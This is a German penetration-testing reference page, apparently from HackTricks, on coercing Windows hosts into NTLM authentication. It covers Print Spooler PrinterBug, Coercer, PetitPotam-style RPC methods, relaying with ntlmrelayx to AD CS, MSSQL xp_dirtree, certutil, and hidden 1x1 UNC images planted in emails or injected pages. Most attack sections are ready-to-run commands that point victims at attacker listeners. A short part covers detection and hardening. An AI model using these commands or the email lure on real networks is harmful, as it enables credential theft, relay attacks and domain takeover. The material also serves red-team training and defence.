# Erzwingen privilegierter NTLM-Authentifizierung

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ist eine **Sammlung** von **remote authentication triggers**, die in C# mit dem MIDL compiler entwickelt wurden, um Abhängigkeiten von Drittanbietern zu vermeiden.

## Missbrauch des Spooler Service

Wenn der _**Print Spooler**_-Dienst **aktiviert** ist, können Sie bereits bekannte AD-Anmeldedaten verwenden, um beim Print Server des Domain Controllers eine **Anfrage** nach einem **Update** zu neuen Druckaufträgen zu stellen und ihm einfach mitzuteilen, die Benachrichtigung an ein bestimmtes System **zu senden**.\
Beachten Sie, dass der Drucker, wenn er die Benachrichtigung an ein beliebiges System sendet, sich bei diesem **System authentifizieren** muss. Daher kann ein Angreifer den _**Print Spooler**_-Dienst dazu bringen, sich bei einem beliebigen System zu authentifizieren, wobei der Dienst für diese Authentifizierung das **Computerkonto** verwendet.

Im Hintergrund missbraucht das klassische **PrinterBug**-Primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** über **`\\PIPE\\spoolss`**. Der Angreifer öffnet zunächst einen Drucker-/Server-Handle und übergibt anschließend einen gefälschten Clientnamen in `pszLocalMachine`, sodass der Ziel-Spooler einen Benachrichtigungskanal **zurück zum vom Angreifer kontrollierten Host** erstellt. Deshalb handelt es sich um eine **ausgehende Authentifizierungs-Erzwingung** und nicht um direkte Codeausführung.<sup>[[2]](#references)</sup>\
Wenn Sie nach **RCE/LPE** im Spooler selbst suchen, lesen Sie [PrintNightmare](printnightmare.md). Diese Seite konzentriert sich auf **coercion und relay**.

### Windows-Server in der Domäne finden

Verwenden Sie PowerShell, um Windows-Hosts aufzulisten. Server sind normalerweise die Ziele mit der höchsten Priorität, konzentrieren Sie sich daher zuerst auf sie:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
Select-Object -ExpandProperty DNSHostName > servers.txt
```
### Spooler-Dienste finden, die auf Verbindungen warten

Verwende eine leicht modifizierte Version von @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), um zu prüfen, ob der Spooler Service auf Verbindungen wartet:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Du kannst unter Linux auch `rpcdump.py` verwenden und nach dem **MS-RPRN**-Protokoll suchen:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Oder teste Hosts schnell von Linux aus mit **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Wenn du **Coercion-Surfaces enumerieren** möchtest, anstatt nur zu prüfen, ob der Spooler-Endpunkt existiert, verwende den **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Dies ist nützlich, da das Anzeigen des Endpunkts in EPM lediglich bedeutet, dass die print-RPC-Schnittstelle registriert ist. Es **garantiert nicht**, dass jede Coercion-Methode mit deinen aktuellen Berechtigungen erreichbar ist oder dass der Host einen nutzbaren authentication flow auslöst.

### Den Dienst auffordern, sich bei einem beliebigen Host zu authentifizieren

Du kannst [SpoolSample aus dem ursprünglichen Repository kompilieren](https://github.com/leechristensen/SpoolSample).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oder verwende [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) oder [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), wenn du Linux verwendest
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Mit **Coercer** kannst du die Spooler-Schnittstellen direkt ansprechen und vermeiden, erraten zu müssen, welche RPC-Methode verfügbar ist:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Moderne RPC-over-TCP-Callbacks

Gehe nicht davon aus, dass ein erfolgreicher Aufruf von `RpcRemoteFindFirstPrinterChangeNotificationEx` zwingend Datenverkehr über TCP/445 erzeugen muss. **Windows 11 22H2 und höher verwenden standardmäßig RPC over TCP für Druckkommunikation**; RPC über named pipes ist deaktiviert, sofern es nicht durch eine Richtlinie oder `RpcUseNamedPipeProtocol=1` wieder aktiviert wird. Daher können ältere SMB-only-Listener melden, dass der Trigger gesendet wurde, während sie den Callback nie empfangen. Microsoft dokumentiert TCP/135 (Endpoint Mapper) sowie dynamische RPC-Ports für normales Print-RPC. Unternehmen können diesen Bereich einschränken oder einen festen Print-RPC-Port auswählen.<sup>[[10]](#references)</sup>

Das aktuelle **Impacket `ntlmrelayx.py`** enthält einen RPC-Relay-Server und einen kleinen Endpoint Mapper, der standardmäßig auf TCP/135 aktiviert ist. Diese Unterstützung wurde im Juni 2025 speziell mit einer demonstrierten PrinterBug-to-AD-CS-Chain gemergt und ermöglicht, den authentifizierten RPC-Callback zu relayn, selbst wenn das Opfer nicht auf SMB/WebDAV zurückfällt.<sup>[[11]](#references)</sup>

Die Unterstützung für RPC Relay/EPM ist in **Impacket 0.13.0 und höher** enthalten. Bevor du einen fehlenden TCP/135-Listener debugst, überprüfe, dass nicht ein älteres gepacktes `ntlmrelayx.py` ausgeführt wird. Die Hilfeausgabe sollte beide RPC-Server-Schalter anzeigen.<sup>[[12]](#references)</sup>
```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Suche in der Relay-Ausgabe nach `Setting up RPC Server on port 135` und `RPCD: Received connection`. Wenn der RPC-Aufruf einen erwarteten Fehler zurückgibt, aber nichts den Listener erreicht, überprüfe die Print-RPC-Transport-Policy des Opfers, die ausgehende Filterung, die DNS-Auflösung und ob ein anderer Prozess bereits TCP/135 verwendet. Stelle außerdem sicher, dass `ntlmrelayx` nicht mit `--no-rpc-server` gestartet wurde.

### HTTP anstelle von SMB mit WebClient erzwingen

Auf Systemen, die weiterhin **RPC über benannte Pipes** verwenden (veraltete Builds oder durch Richtlinien wiederhergestelltes Verhalten), führt der klassische PrinterBug normalerweise zu einer **SMB**-Authentifizierung bei `\\attacker\share`, was weiterhin für **capture**, **relay zu HTTP-Zielen** oder **relay, wenn SMB signing fehlt**, nützlich ist.\
Das Relaying von **SMB zu SMB** wird jedoch häufig durch **SMB signing** blockiert, weshalb Operatoren stattdessen möglicherweise **HTTP/WebDAV**-Authentifizierung erzwingen möchten. Dies ist kein Fallback für das oben beschriebene RPC-over-TCP-Verhalten.

Wenn auf dem Ziel der Dienst **WebClient** ausgeführt wird, kann der Listener in einer Form angegeben werden, die Windows dazu veranlasst, **WebDAV über HTTP** zu verwenden:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Dies ist besonders nützlich in Kombination mit **`ntlmrelayx --adcs`** oder anderen HTTP relay targets, da dadurch nicht darauf vertraut werden muss, dass SMB relay auf der erzwungenen Verbindung möglich ist. Der wichtige Hinweis ist, dass **WebClient auf dem Opfer ausgeführt werden muss**, damit die HTTP/WebDAV-Variante funktioniert.

### Kombination mit Unconstrained Delegation

Wenn ein Angreifer einen Computer kompromittiert hat, der für [Unconstrained Delegation](unconstrained-delegation.md) konfiguriert ist, kann er **den Drucker dazu zwingen, sich bei diesem Computer zu authentifizieren**. Das **TGT** des Drucker-Computerkontos wird anschließend im Speicher auf dem Unconstrained-Delegation-Host zwischengespeichert, wo der Angreifer es abrufen und mit [Pass the Ticket](pass-the-ticket.md) wiederverwenden kann.

### Hinweise zur Erkennung und Härtung

Die zuverlässigste Methode, PrinterBug von einem DC, einer PAW oder einem Server, der nicht druckt, zu entfernen, besteht darin, den Spooler zu beenden und zu deaktivieren. Wenn Drucken erforderlich ist, sollte jedes mögliche relay target gehärtet werden (SMB server signing, LDAP signing/channel binding und EPA bei HTTP-Diensten wie AD CS), anstatt davon auszugehen, dass das Blockieren von TCP/445 im Callback-Pfad ausreichend ist.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Wenn der Host weiterhin **lokales Drucken** benötigt, ist die GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled` eine gezieltere Kontrolle. Dadurch wird verhindert, dass der Spooler Remote-Clientverbindungen (und printer sharing) akzeptiert, während der Dienst lokal verfügbar bleibt. Starte den Spooler nach der Anwendung neu und wiederhole anschließend die oben genannten MS-RPRN-Erreichbarkeitsprüfungen.<sup>[[13]](#references)</sup>

Die Detection sollte einen authentifizierten Aufruf an die MS-RPRN-UUID `12345678-1234-abcd-ef00-0123456789ab` korrelieren, insbesondere opnum 62/65 mit einem nicht-lokalen Callback-Wert, sowie eine unmittelbar darauf folgende ausgehende SMB-, HTTP- oder RPC-Verbindung vom Spooler-Host. Erfasse als Baseline **Interface-UUID/opnum sowie Quell-/Zielpaare**, nicht nur den Zugriff auf `\PIPE\spoolss`, da aktuelle print stacks den Callback über RPC-over-TCP ausführen können.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (Interfaces/Opnums, die ausgehende Authentifizierung auslösen)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Hinweise: asynchrones print interface auf derselben Spooler-Pipe; verwende Coercer, um erreichbare Methoden auf einem bestimmten Host aufzulisten<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (auch über \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Häufig missbrauchte Opnums: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Hinweis: Diese Methoden akzeptieren Parameter, die einen UNC-Pfad enthalten können (z. B. `\\attacker\share`). Bei der Verarbeitung authentifiziert sich Windows (im Maschinen-/Benutzerkontext) bei diesem UNC und ermöglicht dadurch das Capturing oder Relay von NetNTLM.\
Beim Spooler abuse bleibt **MS-RPRN opnum 65** das am häufigsten verwendete und am besten dokumentierte Primitive, da die Protokollspezifikation ausdrücklich festlegt, dass der Server einen Notification Channel zurück zum Client erstellt, der durch `pszLocalMachine` angegeben wird.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN über \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effekt: Das Ziel versucht, den angegebenen Pfad zur Backup-Logdatei zu öffnen, und authentifiziert sich beim vom Angreifer kontrollierten UNC.<sup>[[1]](#references)</sup>
- Praktische Verwendung: Tier-0-Assets (DC/RODC/Citrix/usw.) dazu zwingen, NetNTLM auszugeben, und anschließend Relay an AD-CS-Endpunkte (ESC8/ESC11-Szenarien) oder andere privilegierte Dienste durchführen.<sup>[[1]](#references)</sup>

## PrivExchange

Der `PrivExchange`-Angriff ist das Ergebnis einer Schwachstelle im **Exchange Server `PushSubscription`-Feature**. Dieses Feature ermöglicht es, den Exchange-Server durch jeden Domain User mit einem Mailbox dazu zu zwingen, sich über HTTP bei einem beliebigen vom Client bereitgestellten Host zu authentifizieren.

Standardmäßig läuft der **Exchange-Dienst als SYSTEM** und verfügt über übermäßige Berechtigungen (insbesondere über **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Diese Schwachstelle kann ausgenutzt werden, um das **Relaying von Informationen an LDAP und anschließend das Extrahieren der NTDS-Datenbank der Domäne** zu ermöglichen. Wenn Relay an LDAP nicht möglich ist, kann diese Schwachstelle weiterhin verwendet werden, um Relay durchzuführen und sich bei anderen Hosts innerhalb der Domäne zu authentifizieren. Die erfolgreiche Ausnutzung dieses Angriffs gewährt mit jedem authentifizierten Domain-User-Konto sofortigen Zugriff auf den Domain Admin.

## In Windows

Wenn du dich bereits innerhalb der Windows-Maschine befindest, kannst du Windows mit privilegierten Konten dazu zwingen, eine Verbindung zu einem Server herzustellen, mit:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oder verwenden Sie diese andere technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es ist möglich, das von Microsoft signierte lolbin certutil.exe zu verwenden, um eine NTLM-Authentifizierung zu erzwingen:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Wenn du die **E-Mail-Adresse** des Benutzers kennst, der sich an einer Maschine anmeldet, die du kompromittieren möchtest, könntest du ihm einfach eine **E-Mail mit einem 1x1-Bild** senden, wie etwa
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Wenn das Opfer sie öffnet, versucht Windows, sich zu authentifizieren.

### MitM

Wenn du einen MitM-Angriff durchführen und HTML in eine vom Opfer angezeigte Seite einschleusen kannst, versuche, ein Bild einzuschleusen, etwa:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Andere Möglichkeiten, NTLM-Authentifizierung zu erzwingen und zu phishen


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1-Cracking

Wenn du [NTLMv1-Challenges erfassen kannst, lies hier, wie du sie crackst](../ntlm/index.html#ntlmv1-attack).\
_Denke daran, dass du zum Cracken von NTLMv1 die Responder-Challenge auf "1122334455667788" setzen musst._



## References

- [1] [Unit 42 – Authentication Coercion entwickelt sich weiter](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog-Remoting-Protokoll](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – RPC-Verbindungsupdates für das Drucken in Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC-Relay-Server und Endpoint Mapper für ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 – Release](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Dem Print Spooler erlauben, Clientverbindungen zu akzeptieren](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
